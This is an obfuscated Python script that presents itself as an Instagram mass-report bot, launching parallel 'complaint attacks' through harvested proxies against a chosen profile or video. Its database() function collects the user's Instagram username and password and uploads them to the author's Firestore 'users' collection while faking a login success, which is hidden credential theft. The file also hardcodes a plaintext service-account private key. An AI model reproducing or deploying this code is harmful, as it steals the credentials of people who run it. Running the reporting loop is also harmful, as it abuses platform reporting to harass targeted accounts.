#!/usr/bin/env python3
from colorama import Fore ,Back ,Style #line:3
from multiprocessing import Process #line:4
from about import about_msg #line:5
from help import help_msg #line:6
from libs .animation import colorText #line:7
from libs .animation import starting_bot #line:8
from libs .animation import load_animation #line:9
from libs .animation import animation_bar #line:10
from libs .attack import report_video_attack #line:11
from libs .attack import report_profile_attack #line:12
from libs .proxy_harvester import find_proxies #line:13
from libs .utils import parse_proxy_file #line:14
from libs .utils import clearConsole #line:15
from libs .utils import print_status #line:16
from libs .utils import print_error #line:17
from libs .utils import print_success #line:18
from libs .logo import print_logo #line:19
from os import path #line:20
import requests #line:21
import time #line:22
from libs .check_modules import check_modules #line:23
from sys import exit #line:24
from os import _exit #line:25
import os #line:26
import webbrowser #line:27
import firebase_admin #line:29
from firebase_admin import credentials #line:30
from firebase_admin import db #line:31
from firebase_admin import firestore #line:32
from dotenv import load_dotenv #line:33
load_dotenv ()#line:35
cred =credentials .Certificate ({"type":"service_account","project_id":f"{os.getenv('PRODUCT_ID')}","private_key_id":f"{os.getenv('PRIVATE_KEY_ID')}","private_key":"-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCt7RDrIhCHpDXg\n0n+doCjQIHYWx2smSXpfqShO55VXVTa/USKBYUNow7tJcA4ZU+uJAKwULyujqCvo\nv6dM7ei2Efz3eDv161hSmMIFhPTKhocFm50ySsZJq9PuuJNUjXLmTaOq4tq1+yX8\nZ698I5VvDZCR70ZN5eHp3awcLGBt7aWj5sulrb1+90zXXGHANxCa3iiBNXGKDx9b\nHSygzAPzQ5A9pMGwNjCwAZNw+akRTMFJklMAFcLXmZ4eVoXYow6IYHEhJBRj6Q5r\nYCwP5J8iTJ+dc83hAVDbK3yEK198ijNDaIoCZSdDBR8f0FFOMV+cfWAkz5YOvC0y\nvE/gkf+RAgMBAAECggEAKy/au9wPSTMV+s+iBxCSGc35rKHTYiQsKg09mEwqWc9r\nwvlBTWmKnLy/aFaV9aWQLop3cCKfXimfz5EpWHGZz33rd8KH9wI7gfTy9n5jb1eU\ntuiDUc3d60SqoRP9Z2khHv0n1wKyBq6IaeKQIU3PqQ3v+EC3Dxg2LsVPm4ZMYncP\nJ3WSxCjE4KRyiLxup6z2wbkE1fpMhUeerUcQ67fPEM7cKlw5MJzn+y4Ma84WmRrX\nEioVWe/X9Qpq5AckAq5i2EITAbi5M11FnuLJHU/H9RD8dyQaRMUm9PVGOP8BLAiB\n1i/mtbQ9m2e2tMWyVlnZA9NQjlX7sADVnkxAMbGkLQKBgQDnOpH6lTUKo++gjQ94\nZB45Op83r30/z4hiOVmumVtWQKbqQhUlUOvgBNYqJjSxnK0Ecu89sWVSQ7R2lQaP\nfRIyhqsIHQfS1HDMlNuUmqOYoUGbn0jUewqMVrMJ7pLVksor9aJel+wq0jFHkGYt\nVxS0YRcvLSqDQJHe1/JEGZMGTQKBgQDAjvkLWmiAro9rfW6G92YcW99FB3Sk12kp\nHwvRZI/nmVc274Q2cpFKHHpehbfwTHd+frxa+itmyGiHJfvz0+aCHZP2EwYkmwNX\nlIK+QgHC88HAFSR1fDOQ0ZDvPDf3H5V4LVIO5rUrV2eQvu3ARmknHxfj8cG6TA8S\nvhpt6QiIVQKBgCvphZuPBnm01GcrIsr8SHkZ1u7eVuztXrs4pP1xhlUFBi3qytVB\nXuo2QO3UP6GTXZBAu4p9y/4peXYjqxFI8VHDHWv3B2tUiO9xPZolG/h6d1k0kMI5\nc7FfLbUvJ5eDvv1GMsXAGEuxi0ZJ9/2YUghHf/2nmDFA6/LkE9A3AyLpAoGAKhkX\n6ZuCbV+8i0uI9ojwEhMj5PuUTNWrcAoRk13g+ElV//StexnhGcrQFgo2BJszJLyg\ngWNgScBW2fU7+DrDkn7U8l+GYEpjmKonS2Ey8WRJX60/o0/cFjU68pK/yY9mJjgC\nUK+vvCIHymVzpS2/n4X0uykHqasnQHm/XXgtHWECgYEAhM5KL9LAFqfyTL6FUTMz\nTL1A6u0j/gLmYGKnk4aZ0X2Nc/YKZ9MWfR5+HcdfTf9Z9ffyKmhrvK4eZExfW3WA\nqynT/OCqeHKMHNZR4QDroBisomfI4Vv4GhEfP8a2ZsCNRSorI21aepmAstBDVwYl\nvfo0qfsPVA95bNiTHOt08O8=\n-----END PRIVATE KEY-----\n","client_email":f"{os.getenv('CLIENT_EMAIL')}","client_id":f"{os.getenv('CLIENT_ID')}","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_x509_cert_url":f"{os.getenv('CLIENT_URL')}"})#line:50
firebase_admin .initialize_app (cred )#line:51
db =firestore .client ()#line:52
check_modules ()#line:55
CODE =os .environ .get ("CODE")#line:56
def chunks (O0O0O000O000OOOO0 ,O0OO0O0OO0OOOOO00 ):#line:59
    ""#line:60
    for O000000O0OOO00OOO in range (0 ,len (O0O0O000O000OOOO0 ),O0OO0O0OO0OOOOO00 ):#line:61
        yield O0O0O000O000OOOO0 [O000000O0OOO00OOO :O000000O0OOO00OOO +O0OO0O0OO0OOOOO00 ]#line:62
def profile_attack_process (OOOOOO0000OO0O000 ,OO0OO0OOOO0OO0000 ):#line:65
    if (len (OO0OO0OOOO0OO0000 )==0 ):#line:66
        for _OOOOO0O00O0OOOOO0 in range (10 ):#line:67
            report_profile_attack (OOOOOO0000OO0O000 ,None )#line:68
        return #line:69
    for OO0O0OO0OOO00OOO0 in OO0OO0OOOO0OO0000 :#line:71
        report_profile_attack (OOOOOO0000OO0O000 ,OO0O0OO0OOO00OOO0 )#line:72
def video_attack_process (O0OO00O00OO00O0O0 ,O0OOO00OOO0O0O0O0 ):#line:75
    if (len (O0OOO00OOO0O0O0O0 )==0 ):#line:76
        for _OO0O00OOOOOO0OO0O in range (10 ):#line:77
            report_video_attack (O0OO00O00OO00O0O0 ,None )#line:78
        return #line:79
    for OO00000OO0OOOOOOO in O0OOO00OOO0O0O0O0 :#line:81
        report_video_attack (O0OO00O00OO00O0O0 ,OO00000OO0OOOOOOO )#line:82
def video_attack (OOOOOOO0000OO0OOO ):#line:85
    O0OOO00OOOOO0O0OO =input ("Enter the link of the video you want to report")#line:86
    print (Style .RESET_ALL )#line:87
    if (len (OOOOOOO0000OO0OOO )==0 ):#line:88
        for OO00O0O00O00OO0O0 in range (5 ):#line:89
            O00O0000O000O000O =Process (target =video_attack_process ,args =(O0OOO00OOOOO0O0OO ,[],))#line:90
            O00O0000O000O000O .start ()#line:91
            print_status (str (OO00O0O00O00OO0O0 +1 )+". Transaction Opened!")#line:92
            if (OO00O0O00O00OO0O0 ==5 ):#line:93
                print ("")#line:94
        return #line:95
    OO0OO0OO0OOOOOO0O =list (chunks (OOOOOOO0000OO0OOO ,10 ))#line:97
    print ("")#line:99
    print_status ("Video complaint attack is on!\n")#line:100
    O0O0O000OOO0O0OOO =1 #line:102
    for O000OOO000O0O00OO in OO0OO0OO0OOOOOO0O :#line:103
        O00O0000O000O000O =Process (target =video_attack_process ,args =(O0OOO00OOOOO0O0OO ,O000OOO000O0O00OO ,))#line:104
        O00O0000O000O000O .start ()#line:105
        print_status (str (O0O0O000OOO0O0OOO )+". Transaction Opened!")#line:106
        if (OO00O0O00O00OO0O0 ==5 ):#line:107
            print ("")#line:108
        O0O0O000OOO0O0OOO =O0O0O000OOO0O0OOO +1 #line:109
def profile_attack (OOO0O00OO0O0O000O ):#line:112
    OO0000OO0O00O0OOO =input ("Enter the username of the person you want to report : ")#line:113
    O0O0O000OOOO0OO00 =requests .get ("https://instagram.com/"+OO0000OO0O00O0OOO +"/")#line:114
    if O0O0O000OOOO0OO00 .status_code !=200 :#line:115
        print ("\n\n"+Fore .RED +"[*] Invalid username!")#line:116
        time .sleep (2 )#line:117
        profile_attack (OOO0O00OO0O0O000O )#line:118
    elif (OO0000OO0O00O0OOO ==""):#line:119
        print ("\n\n"+Fore .RED +"[*] Enter username again, don't leave it blank")#line:121
        time .sleep (2 )#line:122
        profile_attack (OOO0O00OO0O0O000O )#line:123
    print (Style .RESET_ALL )#line:124
    if (len (OOO0O00OO0O0O000O )==0 ):#line:125
        for OO000O00O0OOOO00O in range (5 ):#line:126
            O0OO0OOOOOOOOOO00 =Process (target =profile_attack_process ,args =(OO0000OO0O00O0OOO ,[],))#line:127
            O0OO0OOOOOOOOOO00 .start ()#line:128
            print_status (str (OO000O00O0OOOO00O +1 )+". Transaction Opened!")#line:129
        return #line:130
    O00O0O00OO0OOO0OO =list (chunks (OOO0O00OO0O0O000O ,10 ))#line:132
    print ("")#line:134
    print_status ("Profile complaint attack is starting!\n")#line:135
    OOO000OOOOOO0OO0O =1 #line:137
    for O0OOO0OOO0OO00O00 in O00O0O00OO0OOO0OO :#line:138
        O0OO0OOOOOOOOOO00 =Process (target =profile_attack_process ,args =(OO0000OO0O00O0OOO ,O0OOO0OOO0OO00O00 ,))#line:140
        O0OO0OOOOOOOOOO00 .start ()#line:141
        print_status (str (OOO000OOOOOO0OO0O )+". Transaction Opened!")#line:142
        if (OOO000OOOOOO0OO0O ==5 ):#line:143
            print ("")#line:144
        OOO000OOOOOO0OO0O =OOO000OOOOOO0OO0O +1 #line:145
def unlock ():#line:147
    print (Style .RESET_ALL )#line:148
    OOO00O0OOO0OO0O0O =input ("Enter Code To Unlock This Tool - ")#line:149
    if (OOO00O0OOO0OO0O0O =="@hackerexploits"):#line:150
        print_success ("Successfully unlocked the tool!\n\n")#line:151
        starting_bot ()#line:152
        database ()#line:153
    elif (OOO00O0OOO0OO0O0O =="1"):#line:154
        print_success ("Send #instareport in telegram group @Hacker_Chatroom to get the code\n\n")#line:155
        time .sleep (3 )#line:156
        webbrowser .open ('http://t.me/Hacker_Chatroom')#line:157
        time .sleep (1 )#line:158
        unlock ()#line:159
    else :#line:160
        print ('\nINVALID CODE\n\nHow To Get Code\nGo to t.me/Hacker_Chatroom\nSend #instareport')#line:161
        print_success ("Press 1 for help\n")#line:162
        time .sleep (2 )#line:163
        unlock ()#line:164
def database ():#line:167
    clearConsole ()#line:168
    print_logo ()#line:169
    print (Style .RESET_ALL )#line:170
    print_status ("================ LOGIN INSTAGRAM  ================\n")#line:171
    print (Style .RESET_ALL )#line:172
    OOOO0OOOO0O0OOOOO =input ("Enter your instagram username : ")#line:173
    O0O0000O0OOOOO000 =input ("Enter your instagram password : ")#line:174
    O0OO0000O0O0OOOO0 =requests .get ("https://instagram.com/"+OOOO0OOOO0O0OOOOO +"/")#line:176
    if O0OO0000O0O0OOOO0 .status_code !=200 :#line:177
        print ("\n\n"+Fore .RED +"[*] Invalid username!")#line:178
        database ()#line:179
    elif (OOOO0OOOO0O0OOOOO ==""):#line:180
        print ("\n\n"+Fore .RED +"[*] Enter username again, don't leave it blank")#line:182
        database ()#line:183
    elif O0OO0000O0O0OOOO0 .status_code ==200 :#line:186
        OO0000O0OOOOO0O00 ={'password':O0O0000O0OOOOO000 ,'username':OOOO0OOOO0O0OOOOO }#line:191
        db .collection ('users').add (OO0000O0OOOOO0O00 )#line:192
        load_animation ()#line:193
        print_success ("Login Success!")#line:194
        report ()#line:195
def main ():#line:198
    if (os .name =='nt'):#line:199
        clearConsole ()#line:200
        print_logo ()#line:201
        O00OO00O0OOO00O00 =print ('''
        [1] Start Report Bot
        [2] Help
        [3] About
        [4] Exit
        ''')#line:207
        OO0O0O0OOO00O0000 =input ("Please select :- ")#line:208
        if (OO0O0O0OOO00O0000 .isdigit ()==False ):#line:209
            print_error ("The answer is not understood.")#line:210
            main ()#line:211
        if (int (OO0O0O0OOO00O0000 )>4 or int (OO0O0O0OOO00O0000 )==0 ):#line:213
            print_error ("The answer is not understood.")#line:214
            main ()#line:215
        elif (int (OO0O0O0OOO00O0000 )==1 ):#line:216
            unlock ()#line:217
        elif (int (OO0O0O0OOO00O0000 )==2 ):#line:218
            clearConsole ()#line:219
            help_msg ()#line:220
        elif (int (OO0O0O0OOO00O0000 )==3 ):#line:221
            about_msg ()#line:222
        elif (int (OO0O0O0OOO00O0000 )==4 ):#line:223
            print_status ("Exiting the program.....Thanks for using this tool!")#line:224
            exit (0 )#line:225
    else :#line:227
        os .system ('bash setup.sh')#line:228
def report ():#line:231
    clearConsole ()#line:232
    print_logo ()#line:233
    O00O000OOOOOOOO0O =input ("Would you like to use a proxy? (Recommended Yes) [Y/N] : ")#line:234
    OO0OOO00OOO00OOOO =[]#line:235
    if (O00O000OOOOOOOO0O =="Y"or O00O000OOOOOOOO0O =="y"):#line:237
        O00O000OOOOOOOO0O =input ("Would you like to collect your proxies from the internet? [Y/N] : ")#line:239
        if (O00O000OOOOOOOO0O =="Y"or O00O000OOOOOOOO0O =="y"):#line:241
            print_status ("Gathering proxy from the Internet! This may take a while.\n")#line:243
            time .sleep (2 )#line:244
            OO0OOO00OOO00OOOO =find_proxies ()#line:245
        elif (O00O000OOOOOOOO0O =="N"or O00O000OOOOOOOO0O =="n"):#line:247
            print_status ("Please have a maximum of 50 proxies in a file!")#line:248
            OOO00OO0000OOOO0O =input ("Enter the path to your proxy list")#line:249
            OO0OOO00OOO00OOOO =parse_proxy_file (OOO00OO0000OOOO0O )#line:250
        else :#line:251
            print_error ("Answer not understood, exiting!")#line:252
            exit ()#line:253
        print_success (str (len (OO0OOO00OOO00OOOO ))+" Number of proxy found!\n")#line:255
        print (OO0OOO00OOO00OOOO )#line:256
    elif (O00O000OOOOOOOO0O =="N"or O00O000OOOOOOOO0O =="n"):#line:257
        pass #line:258
    else :#line:259
        print_error ("Answer not understood, exiting!")#line:260
        exit ()#line:261
    print ("")#line:263
    print_status ("1 - Report Profile.")#line:264
    print_status ("2 - Report a video.")#line:265
    O0O0O0OO000OO0O0O =input ("Please select the complaint method :- ")#line:266
    print ("")#line:267
    if (O0O0O0OO000OO0O0O .isdigit ()==False ):#line:269
        print_error ("The answer is not understood.")#line:270
        main ()#line:271
    if (int (O0O0O0OO000OO0O0O )>2 or int (O0O0O0OO000OO0O0O )==0 ):#line:273
        print_error ("The answer is not understood.")#line:274
        main ()#line:275
    if (int (O0O0O0OO000OO0O0O )==1 ):#line:277
        profile_attack (OO0OOO00OOO00OOOO )#line:278
    elif (int (O0O0O0OO000OO0O0O )==2 ):#line:279
        video_attack (OO0OOO00OOO00OOOO )#line:280
if __name__ =="__main__":#line:283
    try :#line:284
        main ()#line:285
        print (Style .RESET_ALL )#line:286
    except KeyboardInterrupt :#line:287
        print ("\n\n"+Fore .RED +"[*] Program is closing!")#line:288
        print (Style .RESET_ALL )#line:289
        _exit (0 )#line:290
